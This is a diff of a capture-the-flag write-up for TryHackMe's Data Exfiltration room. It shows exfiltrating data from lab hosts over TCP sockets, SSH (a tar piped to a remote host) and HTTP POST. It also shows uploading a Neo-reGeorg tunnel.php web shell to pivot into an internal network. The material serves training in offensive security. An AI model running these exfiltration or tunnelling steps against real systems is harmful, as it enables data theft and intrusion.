@@ -6,9 +6,11 @@ tags: [data-exfiltration, red-teaming]
 img_path: /assets/red-teaming/data-exfiltration
 mermaid: true
 ---
+![Data Exfiltration Banner](data-exfiltration-room-banner.png)
+
 > This is content from THM's [Data Exfiltration](https://tryhackme.com/room/dataxexfilt) room, part of the **Red Teaming** learning path.
 
-# What is Data Exfiltration?
+# 1. What is Data Exfiltration?
 
 **Data Exfiltration (DE)** is a technique used to transfer data from the target's machine to the attacker's machine. The goal is to **mimic normal network activities** in order to hide the transfer and bypass security measures.
 
@@ -16,7 +18,7 @@ This process is part of the last step on the [Cyber Kill Chain](https://www.lock
 
 ![Cyber Kill Chain](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/photo/cyber/THE-CYBER-KILL-CHAIN-body.png.pc-adaptive.1280.medium.png){: width="70%"}
 
-# Network Infrastructure
+# 2. Network Infrastructure
 
 This room has the following network infrastructure available:
 
@@ -36,9 +38,9 @@ It consists of two separate networks with multiple clients as well as a Jumpbox 
 
 It is recommended to connect via SSH to the Jumpbox machine, and perform the rooms exercises from there. 
 
-The room also suggests using `tmux` to manage the SSH connections needed. Another way is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.
+The room also suggests using `tmux` to manage the SSH connections needed. Another way, is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.
 
-# TCP Socket Exfiltration
+# 3. TCP Socket Exfiltration
 
 This method is **easy to detect** as it relies on non-standard protocols, so it is only used when the attacker knows that they are no network-based security products. 
 
@@ -101,9 +103,11 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
 
     ![Connection and data received](conn-received.png)
 
-4. We now need to decode and unarchive the data as it currently is in a non-human readable format.
+4. We have successfully transferred the data in a non-human readable format:
 
     ![Encoded data](encoded_data.png)
+
+    We now need to decode and unarchive it:
 
     ```shell
     # move the /tmp/ directory
@@ -134,7 +138,7 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
 
     ![Decoding and unarchiving data](decode-unarchive-data.png)
 
-# SSH Exfiltration
+# 4. SSH Exfiltration
 
 To transfer data over SSH, we can either use the Secure Copy Protocol, `scp`, or the SSH client. For this task, we assume that we don't have the `scp` command available. 
 
@@ -142,25 +146,27 @@ We will use the Jumpbox as our exfiltration server, since it has an SSH server e
 
 ![Files to be trasmitted](task5-creds.png)
 
-We will use the same method as before to archive the data, but this time instead of redictering them through an TCP socket, we will send the standard output via SSH:
+We will use the same method as before to archive the data, but this time instead of redictering them through a TCP socket, we will send the standard output via SSH:
 
 ```shell
 tar zcf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
 ```
 
-The above command creates a tarball and sends it over SSH to the Jumpbox SSH server for extraction. Let's break it down step by step:
+The above command creates a tarball and sends it over SSH to the Jumpbox SSH server for extraction. SSH clients provide a way to execute a single command without having a full session. Let's break it down step by step:
 
 1. `tar zcf - task5/` We have seen this part of the command before, which compresses and archives the data.
 
 2. `|` We have also seen what the *pipe operator* does.
 
-3. `ssh thm@jump.thm.com "cd /tmp/; tar xpf -"` This part of the command uses the ssh command to establish an SSH connection to the remote server "*jump.thm.com*" with the username "*thm*". Here's what's happening in the SSH command:
-    - `ssh thm@jump.thm.com` Initiates an SSH connection to the remote server "*jump.thm.com*" with the username "*thm*".
-    - `"cd /tmp/; tar xpf -"` This part is executed on the remote server after the SSH connection is established. It changes the working directory to "*/tmp*", and then extracts a tarball from standard input (indicated by `-`). The `p` options is used to preserve file permissions, ownership, and timestamps when extracting files. This ensures that the extracted files retain their original attributes.
+3. `ssh thm@jump.thm.com "cd /tmp/; tar xpf -"` This part of the command uses the `ssh` command to establish an SSH connection. Here's what's happening:
+    - `ssh thm@jump.thm.com` Initiates an SSH connection to the remote server `jump.thm.com` with the username `thm`.
+    - `"cd /tmp/; tar xpf -"` This part is executed on the remote server after the SSH connection is established. It changes the working directory to `/tmp`, and then extracts a tarball from standard input. The `p` options is used to preserve file permissions, ownership, and timestamps when extracting files. This ensures that the extracted files retain their original attributes.
 
 ![SSH transmission](ssh-transmission.png)
 
-# HTTP(S) Exfiltration
+# 5. HTTP(S) Exfiltration
+
+## 5.1 HTTP POST Request
 
 Data Exfiltration through HTTP(S) is one of the best methods, as it hard to distinguish between legitimate and malicious HTTP traffic. We will be using the **POST HTTP request**, as with a **GET HTTP request**, all parameters are registered into the log file. POST HTTP requests:
 - Are never cached.
@@ -180,13 +186,11 @@ sudo cat /var/log/apache2/access.log
 ```
 The first line is a **GET** request which includes a `file` parameter with exfiltrated data. If we decode this data, we will get the 🚩 required for the first question. The second line is a **POST** request to `/example.php`, in which we sent the same `base64` encoded data, but it does not show what data was transmitted. 
 
-We can decode the data as follows:
+We can decode the data needed for the flag as follows:
 
-```shell
-echo "VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo=" > encoded-data.txt
-base64 -d encoded-data.txt
-# THM{$$$$-$$$-$$-$$$$$}
-```
+![First flag](first-flag.png)
+
+## 5.2 HTTP Data Exfiltration
 
 The steps to perform HTTP exfiltration are:
 1. We need an HTTP webserver with a data handler (a PHP page that handles the POST request sent to the server). In our case, `web.thm.com` and `contact.php`, respectively.
@@ -235,21 +239,21 @@ The above PHP script will handle POST requests via the `file` parameter and stor
     # http.bs64
     ```
 
-    Although we have managed to transfer the data, if we take a closer look, it is broken base64:
+    Although we have managed to transfer the data, if we take a closer look, it is broken base64: the `+` symbol got replaced with spaces.
 
     ![Broken base64 data](url-encoding.png)
 
-    This is due to **URL encoding** over HTTP. The `+` symbold got replaced with spaces. We can fix that using `sed`:
+    This happend due to **URL encoding** over HTTP. We can easily fix it using `sed`:
 
     ```shell
     sudo sed -i 's/ /+/g' /tmp/http.bs64
     ```
 
-    The provided command uses the **stream editor** utility, `sed`, to make in-place replacements in a text file located at `/tmp/http.bs64`:
+    The provided command uses the **stream editor** utility, `sed`, to make in-place replacements in the `/tmp/http.bs64` file:
 
     1. `sed` This is a stream editor used to perform basic text transformations on an input stream (a file or data provided via a pipe).
 
-    2. `-i` This is an option for sed, which indicates that it should edit the file in place.
+    2. `-i` This option indicates that it should edit the file in place.
 
     3. `'s/ /+/g'` This is the sed command to perform the text transformation. It's written in the form of a **substitution command**. Here's what each part does:
         - `s` This indicates that it's a substitution operation.
@@ -260,8 +264,50 @@ The above PHP script will handle POST requests via the `file` parameter and stor
 
     4. `/tmp/http.bs64` This is the path to the file on which sed will operate.
 
+    ![sed command](sed-command.png)
+
 4. Finally, we need to decode the data:
 
     ```shell
     base64 -d /tmp/http.bs64 | tar xvfz -
     ```
+## 5.3 HTTP Tunnelling
+
+In our network configuration, the `uploader.thm.com` server is reachable from the Internet, but the `app.thm.com` and `flag.thm.com` servers are not. The latter runs locally and provides services only for the internal network.
+
+![Uploader vs. app server](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92004a7c6a572f9680f0056b9aa88baa.png)
+
+1. Our goal for this section, is to create an **HTTP Tunnel** to pivot into the internal network and communicate with the `flag.thm.com` server. For achieving this, we will be using the [**Neo-reGeorg**](https://github.com/L-codes/Neo-reGeorg) tool. Let's clone it in our local machine:
+
+    ```shell
+    git clone https://github.com/L-codes/Neo-reGeorg
+    ```
+
+2. Next, we need to generate an encrypted client file to upload it to the target web server:
+
+    ```shell
+    python3 neoreg.py generate -k thm
+    ```
+
+    The above command generates an encrypted tunnelling clients with `thm` as their key under the `neoreg_servers/` directory. Various file extensions are available, but we will use the `tunnel.php` file for this one.
+
+    ![tunnel client list](neoreg-servers.png)
+
+3. Now, we need to upload our client at the `uploader.thm.com` server. We can visit it via our browser at http://10.10.19.86/uploader. To upload the `tunnel.php` we must use "admin" as the key.
+
+    ![Tunnel Upload](tunnel-upload.jpg)
+
+4. Once the file is uploaded, we will point to it using the `neoreg.py` script in order to connect to the client, providing the key to decrypt the tunnelling client:
+
+    ```shell
+    python3 neoreg.py -k thm http://10.10.19.86/uploader/files/tunnel.php
+    ```
+
+    We should get a screen that says that a **SOCKS5 server** has started at `127.0.0.1:1080`.
+
+    ![socks5 server](socks-server.jpg)
+
+5. We can now use the tunnel for accessing the `flag.thm.com` server with an IP address of `172.20.0.120:80`. We leave the tunnel terminal tab as it is, and on a new terminal/tab we communicate with the server via `curl`:
+
+![Flag 2](flag2.jpg)
+
